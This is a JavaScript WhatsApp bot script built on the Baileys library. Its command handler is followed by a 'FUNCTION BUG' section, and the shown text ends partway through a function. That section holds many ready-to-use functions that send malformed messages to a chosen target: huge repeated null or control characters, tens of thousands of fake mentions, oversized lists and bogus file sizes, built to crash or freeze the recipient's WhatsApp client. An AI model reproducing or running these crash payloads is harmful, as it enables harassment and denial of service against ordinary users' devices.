//CONSOLE CLEAR
console.clear();
//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = asep = async (asep, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await asep.decodeJid(asep.user?.id || '');
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));

const formatJid = num => num.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

const isCreator = [botNumber, ...global.owner].map(formatJid).includes(m.sender);
const isPremium = isCreator || premuser.map(u => formatJid(u.id)).includes(m.sender);

if (!asep.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await asep.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
const pushname = m.pushName || "No Name"
//======================
if (m.message) {
asep.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FAKE QOUTED
const foto = fs.readFileSync('./image/Asep.jpg')

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: 8888,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `silent dropper⇜👑* `,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363418937884318@newsletter"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const qstore = {
   key: {
      fromMe: false,
     participant: `0@s.whatsapp.net`,
   ...(m.chat ? {
         remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": foto,
},
"title": `𖤛Kurapika𖤛`,
"description": null,
"retailerId": ` `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "𖤛Kurapika𖤛"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
//FUNCTION BUG
async function combo3(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Kurapika😳',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Kurapika😳"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ nika.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await asep.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("Bug")} to ${target}`))
}

async function combo2(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Kurapika😳',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Kurapika😳"
                },
                footer: {
                  text: "nika.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await asep.relayMessage("status@broadcast", msg, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
async function VampSpam(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Kurapika Is Here❗",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await asep.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampDeviceCrash(target) {
    await asep.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Kurapika Is Here❗",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function VampPaymentCrash(target, Ptcp = true) {
    await asep.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Flixce.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function VampDelayMess(target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Domain Is Here\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Kurapika Is Here❗ 🐍 Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await asep.relayMessage(target, message, {
        participant: { jid: target }
    });
}

async function VampPrivateBlank(target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Kurapika Is Here❗ 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await asep.relayMessage(target, message, { participant: { jid: target } });
}

async function VampDelayCrash(target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Kurapika❗ 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await asep.relayMessage(target, message, { participant: { jid: target } });
}

async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Kurapika Is❗ 🐍 Here",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await asep.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Kurapika Is Here❗ 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


        // Func Protocol 
async function protocolbug1(isTarget, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Ciee Kena Bug ya??",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: isTarget,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( Script Kurapika Is Here❗ )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(isTarget, MSG, {});

await asep.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await asep.relayMessage(
isTarget,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 *Kurapika Is Here❗* - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "? ???????-?",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/b+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
